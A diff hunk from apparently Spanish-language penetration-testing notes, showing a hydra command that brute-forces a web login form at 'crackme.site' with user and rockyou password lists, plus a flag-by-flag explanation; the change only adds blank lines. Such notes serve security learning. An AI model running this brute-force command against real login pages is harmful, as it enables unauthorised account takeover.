@@ -284,12 +284,19 @@ consiguiendo os shell:
     hydra crackme.site http-post-form "/login.php:usr=^USER^&pwd=^PASS^:invalid credentials" -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/rockyou-15.txt -f -V
     
  http-post-form = tipo de ataque
+ 
  /login.php = destino de ataque
+ 
  usr=^USER^&pwd=^PASS^ = nombre de los login form 
+ 
  invalid credentials = mensaje que aparece cuando el login es incorrecto
+ 
  -L = lista de usuarios a testear
+ 
  -P = lista de passwords a testear 
+ 
  -f = si encuentra una combinación correcta, deja de atacar
+ 
  -V = verbose
  
  ## Hashcat
